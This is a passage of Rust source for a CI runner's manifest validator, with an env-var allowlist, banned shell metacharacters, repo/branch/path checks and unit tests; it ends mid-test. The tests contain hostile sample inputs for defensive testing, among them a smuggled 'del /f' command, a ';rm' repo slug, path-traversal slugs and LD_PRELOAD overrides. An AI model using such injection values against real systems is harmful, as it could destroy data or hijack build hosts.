//! `.qontinui/ci.toml` manifest — the ONLY source of executed commands
//! (plan §4.1: coord's dispatch carries no commands; the manifest is read
//! from the checked-out tree at the dispatched SHA and validated strictly).
//!
//! Beyond commands the manifest also DECLARES what the dispatch needs
//! provisioned — sibling repos ([`CiSibling`]) and tools ([`CiTool`]).
//! Declarative rather than executable on purpose: an in-manifest
//! `git clone …` or `cargo install …` step would pass the argv rules below
//! today (no banned metacharacter, and the executor does not sandbox the
//! filesystem), but it would be **unpinned** — no SHA coordination with the
//! dispatched commit — and **uncleaned**, because cleanup removes only the
//! dispatch-scoped directory. A declaration is pinnable and auditable; a
//! clone step is neither. The Actions lane reached the same conclusion
//! independently and now machine-enforces it
//! (`.github/workflows/forbid-sibling-clone.yml`).

use serde::Deserialize;
use std::collections::BTreeMap;

use super::host_sizing::HostSizing;

/// Default per-step timeout (1h) when a step does not specify one.
pub(crate) const DEFAULT_STEP_TIMEOUT_SECS: u64 = 3_600;
/// Hard cap on any step's timeout (2h) — a larger value is a validation
/// error, not a clamp, so authors see the limit instead of silently losing
/// budget.
pub(crate) const MAX_STEP_TIMEOUT_SECS: u64 = 7_200;

/// Env vars a step may set. Deliberately a tight allowlist of build-tuning
/// knobs: nothing PATH/CARGO_HOME-class that could redirect binary or
/// toolchain resolution on the host.
///
/// THIS IS A SECURITY BOUNDARY. Every entry is justified individually below;
/// there is no batch approval. The test `env_outside_allowlist_rejected`
/// pins the classes that must never be added.
const ENV_ALLOWLIST: &[&str] = &[
    "RUSTFLAGS",
    "RUST_BACKTRACE",
    "RUST_LOG",
    "CARGO_INCREMENTAL",
    "CARGO_TERM_COLOR",
    "NODE_OPTIONS",
    "NODE_ENV",
    "CI",
    "QONTINUI_DISABLE_KEYCHAIN",
    // ── Added for Actions-lane parity. Each entry below is set by a LIVE
    // gate step in one of the two Actions workflows this lane must agree
    // with; nothing was added speculatively.
    //
    // `qontinui-runner/.github/workflows/ci.yml` sets this on its Rust test
    // step. It selects the runner's own no-database test mode. Product
    // feature flag, same class as QONTINUI_DISABLE_KEYCHAIN above: it cannot
    // influence which binary or toolchain resolves. Without it the runner's
    // own `.qontinui/ci.toml` cannot reach parity with its Actions gate.
    "QONTINUI_ALLOW_NO_DB",
    // `qontinui-coord/.github/workflows/ci.yml` sets `CARGO_PROFILE_TEST_DEBUG=0`
    // on its db-test job. It is a cargo PROFILE override — it lowers the
    // debuginfo emitted into test binaries — so it changes the footprint of
    // the artifacts, never the resolution of a program. That footprint is
    // exactly the thing a small host runs out of, so a manifest must be able
    // to trade backtrace quality for headroom the way the Actions lane does.
    "CARGO_PROFILE_TEST_DEBUG",
    //
    // ── NOTHING WAS ADDED FOR THE NODE/PYTHON REGISTRY ENTRIES ───────────
    //
    // Opening the tool registry to node/npm and to Python packages
    // (`ci_node::tools`) raised the obvious question of whether that ecosystem
    // needs its own keys here — `POETRY_*`, `npm_config_*`, `PIP_*`,
    // `PYTHONPATH`. The answer is NO, on two independent grounds, and it is
    // recorded rather than left as an absence.
    //
    // 1. THE EXISTING BAR IS NOT MET. Every entry above is set by a LIVE gate
    //    step in an Actions workflow this lane must agree with; nothing was
    //    added speculatively. Re-checked 2026-08-18 across
    //    qontinui/.github/workflows, qontinui-web/.github/workflows,
    //    qontinui-schemas/.github/workflows and qontinui-runner/.github/
    //    workflows: not one `POETRY_*`, `npm_config_*`, `NPM_*` or `PIP_*`
    //    variable is set by any step. The poetry jobs are plain
    //    `poetry install` / `poetry run …`; the node jobs are plain
    //    `pnpm …`. Adding a key "because the ecosystem has one" is exactly the
    //    batch approval this boundary forbids.
    //
    // 2. THE ONES THAT WOULD MATTER ARE THE FORBIDDEN CLASS ANYWAY.
    //    `npm_config_prefix`, `npm_config_cache`, `PIP_TARGET`,
    //    `PIP_INDEX_URL`, `POETRY_VIRTUALENVS_PATH` and `PYTHONPATH` all
    //    redirect where a tool RESOLVES or INSTALLS things — the same class as
    //    PATH, CARGO_HOME and LD_PRELOAD, which this list exists to keep out
    //    of a manifest's hands. The provisioned tool's own layout is owned by
    //    the executor, the way it already owns PATH and CARGO_TARGET_DIR: the
    //    registry installs into a version-keyed cache and puts exactly that
    //    directory on the front of PATH. A manifest that could re-point the
    //    prefix could un-provision the tool it just declared.
    //
    // A project's dependency install stays a STEP (`npm ci`, `poetry
    // install`), which needs no env at all — it is repo-scoped and
    // lockfile-pinned. `NODE_OPTIONS`/`NODE_ENV`/`CI` above already cover what
    // those steps legitimately tune. The test
    // `ecosystem_env_still_outside_the_allowlist` pins this decision.
];

/// Env vars the EXECUTOR owns and exports itself. A step setting one of
/// these would be silently overridden (the executor's value wins — see
/// `executor::run_step`), so they are rejected at validation with a message
/// naming the manifest key that actually controls them. Rejecting is
/// strictly better than allowlisting-then-ignoring: a cap that looks set but
/// is not is how `--test-threads 4` ended up smuggled through argv.
const EXECUTOR_OWNED_ENV: &[(&str, &str)] = &[
    ("CARGO_BUILD_JOBS", "[limits].cargo_build_jobs"),
    ("RUST_TEST_THREADS", "[limits].test_threads"),
    ("NEXTEST_TEST_THREADS", "[limits].test_threads"),
    (
        "CARGO_TARGET_DIR",
        "the executor's per-repo CI target dir (not settable)",
    ),
];

/// Shell metacharacters banned from command argv tokens. Commands are
/// executed as argv (never a shell string), but on Windows a `.cmd` shim
/// (pnpm) requires a `cmd.exe /C` respawn where these would become live —
/// banning them keeps that fallback injection-safe.
const ARGV_BANNED_CHARS: &[char] = &['&', '|', '<', '>', '^', '"', '\n', '\r', '\0', '%'];

/// Upper bound on declared siblings/tools per manifest. Not a security
/// property — a legibility one: a manifest needing more than this has a
/// layout problem the executor should not paper over.
const MAX_PROVISIONED_ENTRIES: usize = 8;

#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub(crate) struct CiManifest {
    /// Manifest schema version — must be exactly 1.
    pub version: u32,
    pub steps: Vec<CiStep>,
    #[serde(default)]
    pub limits: CiLimits,
    /// Sibling repos to materialise alongside the dispatched worktree so
    /// relative path-deps (`../qontinui-schemas/rust`) resolve.
    #[serde(default)]
    pub siblings: Vec<CiSibling>,
    /// Tools the runner must supply on the step PATH.
    #[serde(default)]
    pub tools: Vec<CiTool>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub(crate) struct CiStep {
    pub name: String,
    /// Argv vector — `["cargo", "test"]`, NEVER a shell string.
    pub command: Vec<String>,
    /// Extra env for this step. Keys must be in the allowlist.
    #[serde(default)]
    pub env: BTreeMap<String, String>,
    /// Per-step timeout; default [`DEFAULT_STEP_TIMEOUT_SECS`], max
    /// [`MAX_STEP_TIMEOUT_SECS`].
    pub timeout_secs: Option<u64>,
    /// Repo-relative working dir (e.g. `src-tauri`). Must not escape the
    /// worktree — validated structurally here AND canonicalize+prefix-checked
    /// at execution time.
    pub working_dir: Option<String>,
}

/// How a sibling's commit is chosen.
///
/// Both variants are the GitHub Actions lane's rule, not a third one. That
/// rule lives in `.github/actions/checkout-sibling/action.yml` (Phase A
/// landed as `a543cc7e1`/#984; Phase B is PR #1008) and the two lanes must
/// agree on which sibling tree a given change compiles against — otherwise
/// "parity" means nothing.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub(crate) enum SiblingPin {
    /// The Actions rule in full: the sibling tree is the **declared
    /// adaptation PR** — the coord dep edge (`coord:downstream-of=` on the
    /// dispatched PR, or `coord:upstream-of=` on a sibling PR) that the pair
    /// already has to declare for merge ordering — pinned to that PR's head
    /// SHA. A branch NAME is not an identity: it cannot be checked for having
    /// a pull request, a reviewer, a current base, or any base at all, and
    /// the identical name-matching mechanism was exploited in production on
    /// 2026-07-28 (a consumer gate went green against a branch with no PR).
    ///
    /// With no declaration — and, per the Actions action's property 3, with
    /// no pull request at all — this resolves to [`CiSibling::branch`]. The
    /// CI-node lane dispatches `refs/heads/merge-candidate/<proposal_id>`
    /// pushes, which is exactly the event class the Actions action resolves
    /// to the default branch WITHOUT an API call, and for the same reason:
    /// coord pushes the SAME candidate ref into every repo of a multi-repo
    /// proposal, so keying off the ref name would compile against a tree that
    /// is force-pushed and deleted as the proposal resolves.
    #[default]
    DeclaredAdaptation,
    /// Always the tip of [`CiSibling::branch`]; declarations are never read.
    /// For siblings that are not part of an adaptation pair — a repo consumed
    /// as a published artifact (e.g. an OpenAPI spec source) rather than
    /// co-evolved with the dispatched repo, and for which no adaptation-PR
    /// protocol exists.
    DefaultBranch,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub(crate) struct CiSibling {
    /// `owner/name`. The owner is REQUIRED here (unlike coord's dep-edge
    /// grammar) because this value is turned into a clone URL, and inferring
    /// an owner for a network fetch is exactly the kind of guess that ends up
    /// pointing at somebody else's repository.
    pub repo: String,
    #[serde(default)]
    pub pin: SiblingPin,
    /// Branch used when no adaptation is declared, and the only source under
    /// [`SiblingPin::DefaultBranch`].
    #[serde(default = "default_sibling_branch")]
    pub branch: String,
    /// Follow a declaration that orders the sibling AFTER this side.
    ///
    /// OFF by default, and the default is the safety property. A dep-edge
    /// label names the pair; its direction names the merge order. When the
    /// sibling LEADS, its tree is what this repo's `main` will contain by the
    /// time this change lands, so compiling against it predicts main. When the
    /// sibling TRAILS, it does not: following the declaration would compile
    /// against a tree that is not main yet and will not be until AFTER this
    /// change lands. A step that mis-declared the direction would then go
    /// green here and red `main` on landing — the exact vacuous green the
    /// declared-adaptation rule exists to prevent, arriving from the other
    /// side.
    ///
    /// Turn it on ONLY for a step whose question is genuinely about the PAIR
    /// rather than about what main will look like: a codegen-drift check,
    /// which asks "do the sibling's checked-in artifacts match what this tree
    /// generates" and must therefore read the paired tree in EITHER order. A
    /// compile step must leave this off.
    #[serde(default)]
    pub accept_trailing_sibling: bool,
}

fn default_sibling_branch() -> String {
    "main".to_string()
}

/// A tool the runner must place on the step PATH.
///
/// NOTE what is deliberately absent: a URL. The manifest names a tool from a
/// closed registry ([`super::tools`]) and pins its version; it cannot point
/// the runner at an arbitrary download. That is a strictly stricter contract
/// than the argv rules — a repo can already run whatever it likes as a step,
/// but it must not be able to make the RUNNER fetch and cache an arbitrary
/// binary under a name that later steps resolve implicitly.
///
/// # Why this is still a flat `{name, version}` pair
///
/// Opening the registry to node raised the question of whether this needs a
/// shape for "a runtime PLUS its package manager" — `node 22` *with* `npm`.
/// It does not, and the decision is deliberate rather than inherited:
/// **npm's version is a property of the node release, not an independently
/// pinnable thing**, so a second version field would be a knob with nothing on
/// the other end (`actions/setup-node` behaves the same way). The
/// runtime-plus-ecosystem shape therefore lives in the REGISTRY — see
/// `ci_node::tools::Installer::PrebuiltTree`'s `companions`, which are checked
/// to exist and to run at provisioning time and whose versions are logged.
///
/// Keeping this pair flat also keeps `deny_unknown_fields` meaningful: every
/// key a manifest may write here is one of exactly two, and any third is a
/// hard parse error rather than a silently ignored hint.
#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub(crate) struct CiTool {
    pub name: String,
    /// Exact version, e.g. `0.9.98`. `latest` is not accepted: an unpinned
    /// tool makes two dispatches of the same commit incomparable, and the
    /// version is also the cache key.
    pub version: String,
}

/// Caps the executor exports to every step.
///
/// A value here is a **CEILING, not an override**: the effective cap is
/// `min(manifest value, host-derived value)`. Both parties know something the
/// other does not — the manifest author has measured this workload's cost per
/// token, the runner has measured this host — and taking the minimum honours
/// both while being able to exceed neither. Omitting a key means "size me from
/// the host", which is what a manifest should do unless it has a measurement.
#[derive(Debug, Clone, Default, Deserialize)]
#[serde(deny_unknown_fields)]
pub(crate) struct CiLimits {
    /// Ceiling on `CARGO_BUILD_JOBS`.
    pub cargo_build_jobs: Option<u32>,
    /// Ceiling on the test-process/thread count. Exported as BOTH
    /// `RUST_TEST_THREADS` (libtest) and `NEXTEST_TEST_THREADS` (nextest) so
    /// the cap holds whichever harness a step uses — the Actions lane caps
    /// both for the same reason.
    pub test_threads: Option<u32>,
}

impl CiStep {
    pub(crate) fn effective_timeout_secs(&self) -> u64 {
        self.timeout_secs.unwrap_or(DEFAULT_STEP_TIMEOUT_SECS)
    }
}

impl CiSibling {
    /// Directory name the sibling is materialised under. The basename of the
    /// slug, which is what a relative path-dep spells.
    pub(crate) fn dir_name(&self) -> &str {
        crate::agent_runtime::local_repo_name(&self.repo)
    }
}

impl CiLimits {
    pub(crate) fn effective_cargo_build_jobs(&self, host: HostSizing) -> u32 {
        cap_against_host(self.cargo_build_jobs, host.cargo_build_jobs)
    }

    pub(crate) fn effective_test_threads(&self, host: HostSizing) -> u32 {
        cap_against_host(self.test_threads, host.test_threads)
    }
}

/// `min(declared, host)`, with a floor of 1 so a `0` in a manifest cannot
/// export a cap cargo would reject.
fn cap_against_host(declared: Option<u32>, host: u32) -> u32 {
    let host = host.max(1);
    match declared {
        Some(d) => d.max(1).min(host),
        None => host,
    }
}

/// Parse + validate a manifest body. All failures are `Err(String)` with an
/// author-actionable message (they end up in the dispatch's log tail).
pub(crate) fn parse_and_validate(text: &str) -> Result<CiManifest, String> {
    let manifest: CiManifest =
        toml::from_str(text).map_err(|e| format!("ci.toml parse error: {e}"))?;
    if manifest.version != 1 {
        return Err(format!(
            "ci.toml version {} unsupported (this runner supports version = 1)",
            manifest.version
        ));
    }
    if manifest.steps.is_empty() {
        return Err("ci.toml has no [[steps]] — nothing to run".to_string());
    }
    validate_siblings(&manifest.siblings)?;
    validate_tools(&manifest.tools)?;
    for (i, step) in manifest.steps.iter().enumerate() {
        let label = if step.name.trim().is_empty() {
            format!("steps[{i}]")
        } else {
            format!("step '{}'", step.name)
        };
        if step.name.trim().is_empty() {
            return Err(format!("{label}: name must be non-empty"));
        }
        if step.command.is_empty() || step.command[0].trim().is_empty() {
            return Err(format!("{label}: command must be a non-empty argv array"));
        }
        for token in &step.command {
            if token.contains(ARGV_BANNED_CHARS) {
                return Err(format!(
                    "{label}: command token {token:?} contains a banned shell metacharacter"
                ));
            }
        }
        for key in step.env.keys() {
            if let Some((_, owner)) = EXECUTOR_OWNED_ENV
                .iter()
                .find(|(owned, _)| *owned == key.as_str())
            {
                return Err(format!(
                    "{label}: env var {key:?} is exported by the executor and would be \
                     overridden — set {owner} instead"
                ));
            }
            if !ENV_ALLOWLIST.contains(&key.as_str()) {
                return Err(format!(
                    "{label}: env var {key:?} is not allowlisted (allowed: {ENV_ALLOWLIST:?})"
                ));
            }
        }
        if let Some(t) = step.timeout_secs {
            if t == 0 || t > MAX_STEP_TIMEOUT_SECS {
                return Err(format!(
                    "{label}: timeout_secs {t} out of range (1..={MAX_STEP_TIMEOUT_SECS})"
                ));
            }
        }
        if let Some(wd) = &step.working_dir {
            validate_working_dir(wd).map_err(|e| format!("{label}: {e}"))?;
        }
    }
    Ok(manifest)
}

fn validate_siblings(siblings: &[CiSibling]) -> Result<(), String> {
    if siblings.len() > MAX_PROVISIONED_ENTRIES {
        return Err(format!(
            "ci.toml declares {} [[siblings]] (max {MAX_PROVISIONED_ENTRIES})",
            siblings.len()
        ));
    }
    let mut seen_dirs: Vec<&str> = Vec::new();
    for s in siblings {
        let label = format!("sibling '{}'", s.repo);
        validate_sibling_repo(&s.repo).map_err(|e| format!("{label}: {e}"))?;
        validate_branch(&s.branch).map_err(|e| format!("{label}: {e}"))?;
        let dir = s.dir_name();
        if seen_dirs.contains(&dir) {
            // Two siblings landing on one directory: the second would hit the
            // "destination already exists" refusal at materialise time, which
            // is a confusing way to report an authoring mistake.
            return Err(format!(
                "{label}: two [[siblings]] resolve to the same directory {dir:?}"
            ));
        }
        seen_dirs.push(dir);
    }
    Ok(())
}

fn validate_tools(tools: &[CiTool]) -> Result<(), String> {
    if tools.len() > MAX_PROVISIONED_ENTRIES {
        return Err(format!(
            "ci.toml declares {} [[tools]] (max {MAX_PROVISIONED_ENTRIES})",
            tools.len()
        ));
    }
    let mut seen: Vec<&str> = Vec::new();
    for t in tools {
        let label = format!("tool '{}'", t.name);
        if super::tools::lookup(&t.name).is_none() {
            return Err(format!(
                "{label}: unknown tool. This runner provisions from a closed registry \
                 (known: {:?}) — a manifest names a tool, it never supplies a URL",
                super::tools::known_tool_names()
            ));
        }
        validate_tool_version(&t.version).map_err(|e| format!("{label}: {e}"))?;
        if seen.contains(&t.name.as_str()) {
            return Err(format!("{label}: declared twice"));
        }
        seen.push(&t.name);
    }
    Ok(())
}

/// `owner/name`, both segments non-empty and made of the characters GitHub
/// actually allows in an owner/repo. Stricter than the argv metacharacter
/// rule because this value is interpolated into a clone URL and into a
/// filesystem path.
fn validate_sibling_repo(repo: &str) -> Result<(), String> {
    if repo.len() > 200 {
        return Err("repo slug too long".to_string());
    }
    let mut parts = repo.split('/');
    let (Some(owner), Some(name), None) = (parts.next(), parts.next(), parts.next()) else {
        return Err(format!(
            "repo {repo:?} must be exactly `owner/name` (the owner is required — it becomes a clone URL)"
        ));
    };
    for seg in [owner, name] {
        if seg.is_empty() || seg == "." || seg == ".." || seg.starts_with('-') {
            return Err(format!("repo {repo:?} has an invalid path segment {seg:?}"));
        }
        if !seg
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
        {
            return Err(format!("repo {repo:?} has an invalid path segment {seg:?}"));
        }
    }
    Ok(())
}

/// A git branch name safe to hand to `git ls-remote` as an explicit refspec.
/// Leading `-` is rejected so the value can never be read as an option.
fn validate_branch(branch: &str) -> Result<(), String> {
    if branch.is_empty() || branch.len() > 200 {
        return Err(format!("branch {branch:?} must be 1..=200 chars"));
    }
    if branch.starts_with('-') || branch.starts_with('/') || branch.ends_with('/') {
        return Err(format!(
            "branch {branch:?} has an invalid leading/trailing character"
        ));
    }
    if branch.contains("..") || branch.contains("//") || branch.contains("@{") {
        return Err(format!("branch {branch:?} contains a forbidden sequence"));
    }
    if !branch
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/'))
    {
        return Err(format!(
            "branch {branch:?} may only contain [A-Za-z0-9._/-]"
        ));
    }
    Ok(())
}

/// A tool version becomes both a URL path segment and a cache directory
/// name, so it is restricted to what a semver-ish release tag can contain and
/// must start with a digit (which also rejects `latest`).
fn validate_tool_version(version: &str) -> Result<(), String> {
    if version.is_empty() || version.len() > 64 {
        return Err(format!("version {version:?} must be 1..=64 chars"));
    }
    if !version.starts_with(|c: char| c.is_ascii_digit()) {
        return Err(format!(
            "version {version:?} must be an exact version starting with a digit \
             (a floating version like \"latest\" makes two dispatches of one commit \
             incomparable, and the version is the cache key)"
        ));
    }
    if version.contains("..") {
        return Err(format!("version {version:?} contains a forbidden sequence"));
    }
    if !version
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '+'))
    {
        return Err(format!(
            "version {version:?} may only contain [A-Za-z0-9._+-]"
        ));
    }
    Ok(())
}

/// Structural check that a working_dir stays inside the worktree: relative,
/// no parent/root/prefix components. Execution additionally canonicalizes
/// and prefix-checks against the real worktree path.
fn validate_working_dir(wd: &str) -> Result<(), String> {
    let path = std::path::Path::new(wd);
    // The `:` check rejects Windows drive-qualified paths (`C:\x`, `C:x`)
    // even when this code runs on a non-Windows host (cross-platform tests).
    if path.is_absolute() || wd.starts_with('/') || wd.starts_with('\\') || wd.contains(':') {
        return Err(format!("working_dir {wd:?} must be repo-relative"));
    }
    for component in path.components() {
        match component {
            std::path::Component::Normal(_) | std::path::Component::CurDir => {}
            _ => {
                return Err(format!(
                    "working_dir {wd:?} must not contain parent/root components"
                ))
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A host large enough that no host cap binds, so limits tests read as
    /// statements about the MANIFEST value.
    const BIG_HOST: HostSizing = HostSizing {
        cargo_build_jobs: 32,
        test_threads: 32,
    };
    /// A host so small every cap binds.
    const TINY_HOST: HostSizing = HostSizing {
        cargo_build_jobs: 1,
        test_threads: 2,
    };

    const VALID: &str = r#"
version = 1

[limits]
cargo_build_jobs = 1

[[steps]]
name = "fmt"
command = ["cargo", "fmt", "--", "--check"]
working_dir = "src-tauri"

[[steps]]
name = "test"
command = ["cargo", "test"]
working_dir = "src-tauri"
env = { QONTINUI_DISABLE_KEYCHAIN = "1" }
timeout_secs = 7200
"#;

    #[test]
    fn valid_manifest_parses() {
        let m = parse_and_validate(VALID).expect("valid manifest must parse");
        assert_eq!(m.version, 1);
        assert_eq!(m.steps.len(), 2);
        assert_eq!(m.limits.effective_cargo_build_jobs(BIG_HOST), 1);
        assert_eq!(
            m.steps[0].effective_timeout_secs(),
            DEFAULT_STEP_TIMEOUT_SECS
        );
        assert_eq!(m.steps[1].effective_timeout_secs(), 7200);
        assert!(m.siblings.is_empty());
        assert!(m.tools.is_empty());
    }

    #[test]
    fn empty_steps_rejected() {
        let err = parse_and_validate("version = 1\nsteps = []\n").unwrap_err();
        assert!(err.contains("no [[steps]]"), "got: {err}");
    }

    #[test]
    fn wrong_version_rejected() {
        let err =
            parse_and_validate("version = 2\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\n")
                .unwrap_err();
        assert!(err.contains("version 2 unsupported"), "got: {err}");
    }

    #[test]
    fn unknown_fields_rejected() {
        let err = parse_and_validate(
            "version = 1\nsurprise = true\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap_err();
        assert!(err.contains("parse error"), "got: {err}");
        let err = parse_and_validate(
            "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nshell = true\n",
        )
        .unwrap_err();
        assert!(err.contains("parse error"), "got: {err}");
    }

    #[test]
    fn non_array_command_rejected() {
        // A shell-string command is a TYPE error under the argv contract.
        let err =
            parse_and_validate("version = 1\n[[steps]]\nname = \"x\"\ncommand = \"cargo test\"\n")
                .unwrap_err();
        assert!(err.contains("parse error"), "got: {err}");
    }

    #[test]
    fn empty_command_rejected() {
        let err =
            parse_and_validate("version = 1\n[[steps]]\nname = \"x\"\ncommand = []\n").unwrap_err();
        assert!(err.contains("non-empty argv"), "got: {err}");
    }

    #[test]
    fn shell_metacharacters_in_argv_rejected() {
        let err = parse_and_validate(
            "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"cargo\", \"test\", \"&& del /f\"]\n",
        )
        .unwrap_err();
        assert!(err.contains("banned shell metacharacter"), "got: {err}");
    }

    #[test]
    fn env_outside_allowlist_rejected() {
        for key in ["PATH", "CARGO_HOME", "RUSTUP_HOME", "LD_PRELOAD"] {
            let text = format!(
                "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nenv = {{ {key} = \"evil\" }}\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(err.contains("not allowlisted"), "{key}: got {err}");
        }
    }

    /// The parity additions are ACCEPTED — each one is set by a live Actions
    /// gate step, and the point of widening the boundary was to let a
    /// manifest express what that step expresses.
    #[test]
    fn parity_env_additions_accepted() {
        for key in ["QONTINUI_ALLOW_NO_DB", "CARGO_PROFILE_TEST_DEBUG"] {
            let text = format!(
                "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nenv = {{ {key} = \"0\" }}\n"
            );
            parse_and_validate(&text)
                .unwrap_or_else(|e| panic!("{key} must be allowlisted, got: {e}"));
        }
    }

    /// Executor-owned knobs are rejected with a message naming the manifest
    /// key that actually controls them — NOT silently accepted and ignored.
    #[test]
    fn executor_owned_env_rejected_with_the_right_pointer() {
        for (key, expect) in [
            ("CARGO_BUILD_JOBS", "[limits].cargo_build_jobs"),
            ("RUST_TEST_THREADS", "[limits].test_threads"),
            ("NEXTEST_TEST_THREADS", "[limits].test_threads"),
            ("CARGO_TARGET_DIR", "per-repo CI target dir"),
        ] {
            let text = format!(
                "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nenv = {{ {key} = \"4\" }}\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(
                err.contains("exported by the executor") && err.contains(expect),
                "{key}: got {err}"
            );
        }
    }

    #[test]
    fn oversize_and_zero_timeouts_rejected() {
        let err = parse_and_validate(
            "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\ntimeout_secs = 7201\n",
        )
        .unwrap_err();
        assert!(err.contains("out of range"), "got: {err}");
        let err = parse_and_validate(
            "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\ntimeout_secs = 0\n",
        )
        .unwrap_err();
        assert!(err.contains("out of range"), "got: {err}");
    }

    #[test]
    fn working_dir_escape_rejected() {
        for wd in ["../sibling", "a/../../b", "/abs", "\\abs", "C:\\abs"] {
            let text = format!(
                "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nworking_dir = {wd:?}\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(
                err.contains("working_dir"),
                "{wd}: expected working_dir rejection, got {err}"
            );
        }
        // A benign nested relative dir passes.
        let ok = parse_and_validate(
            "version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\nworking_dir = \"src-tauri\"\n",
        );
        assert!(ok.is_ok());
    }

    // ── [limits] ──────────────────────────────────────────────────────────

    /// Omitting a limit means "size me from the host".
    #[test]
    fn absent_limits_take_the_host_sizing() {
        let m = parse_and_validate("version = 1\n[[steps]]\nname = \"x\"\ncommand = [\"true\"]\n")
            .unwrap();
        assert_eq!(m.limits.effective_cargo_build_jobs(BIG_HOST), 32);
        assert_eq!(m.limits.effective_test_threads(BIG_HOST), 32);
        assert_eq!(m.limits.effective_cargo_build_jobs(TINY_HOST), 1);
        assert_eq!(m.limits.effective_test_threads(TINY_HOST), 2);
    }

    /// A declared limit is a CEILING: it can lower the host's answer but
    /// never raise it, and the host can lower the declaration.
    #[test]
    fn declared_limits_are_ceilings_in_both_directions() {
        let m = parse_and_validate(
            "version = 1\n[limits]\ncargo_build_jobs = 1\ntest_threads = 4\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap();
        // Big host, tight manifest: the manifest's measurement wins.
        assert_eq!(m.limits.effective_cargo_build_jobs(BIG_HOST), 1);
        assert_eq!(m.limits.effective_test_threads(BIG_HOST), 4);
        // Tiny host, looser manifest: the host wins.
        assert_eq!(m.limits.effective_test_threads(TINY_HOST), 2);

        let m = parse_and_validate(
            "version = 1\n[limits]\ncargo_build_jobs = 64\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap();
        assert_eq!(m.limits.effective_cargo_build_jobs(BIG_HOST), 32);
        assert_eq!(m.limits.effective_cargo_build_jobs(TINY_HOST), 1);
    }

    /// `0` in a manifest must not export a cap cargo would reject.
    #[test]
    fn zero_limit_floors_to_one() {
        let m = parse_and_validate(
            "version = 1\n[limits]\ncargo_build_jobs = 0\ntest_threads = 0\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap();
        assert_eq!(m.limits.effective_cargo_build_jobs(BIG_HOST), 1);
        assert_eq!(m.limits.effective_test_threads(BIG_HOST), 1);
    }

    // ── [[siblings]] ──────────────────────────────────────────────────────

    #[test]
    fn siblings_parse_with_defaults() {
        let m = parse_and_validate(
            "version = 1\n[[siblings]]\nrepo = \"qontinui/qontinui-schemas\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap();
        assert_eq!(m.siblings.len(), 1);
        assert_eq!(m.siblings[0].pin, SiblingPin::DeclaredAdaptation);
        assert_eq!(m.siblings[0].branch, "main");
        assert_eq!(m.siblings[0].dir_name(), "qontinui-schemas");
    }

    #[test]
    fn sibling_pin_is_kebab_case_and_closed() {
        let m = parse_and_validate(
            "version = 1\n[[siblings]]\nrepo = \"o/r\"\npin = \"default-branch\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap();
        assert_eq!(m.siblings[0].pin, SiblingPin::DefaultBranch);
        let err = parse_and_validate(
            "version = 1\n[[siblings]]\nrepo = \"o/r\"\npin = \"whatever-i-like\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        )
        .unwrap_err();
        assert!(err.contains("parse error"), "got: {err}");
    }

    /// The slug becomes a clone URL AND a directory name, so it is validated
    /// harder than an argv token.
    #[test]
    fn sibling_repo_slug_rejections() {
        for bad in [
            "qontinui-schemas",          // no owner — would need a guess
            "qontinui/schemas/rust",     // three segments
            "qontinui/../secret",        // traversal
            "../qontinui-schemas",       // traversal
            "qontinui/",                 // empty name
            "/qontinui-schemas",         // empty owner
            "qontinui/qontinui schemas", // space
            "qontinui/-leading",         // reads as an option
            "qontinui/repo;rm",          // punctuation
        ] {
            let text = format!(
                "version = 1\n[[siblings]]\nrepo = {bad:?}\n\
                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(
                err.contains("repo") || err.contains("segment"),
                "{bad}: got {err}"
            );
        }
    }

    #[test]
    fn sibling_branch_rejections() {
        for bad in ["-x", "a..b", "a//b", "main@{1}", "with space", "trailing/"] {
            let text = format!(
                "version = 1\n[[siblings]]\nrepo = \"o/r\"\nbranch = {bad:?}\n\
                 [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n"
            );
            let err = parse_and_validate(&text).unwrap_err();
            assert!(err.contains("branch"), "{bad}: got {err}");
        }
        let ok = parse_and_validate(
            "version = 1\n[[siblings]]\nrepo = \"o/r\"\nbranch = \"release/1.x\"\n\
             [[steps]]\nname = \"x\"\ncommand = [\"true\"]\n",
        );
        assert!(ok.is_ok());
    }

    /// Two siblings on one directory is an authoring mistake, caught here
    /// rather than as a confusing "destination exists" at materialise time.
    #[test]
    fn colliding_sibling_directories_rejected() {
        let err = parse_and_validate(
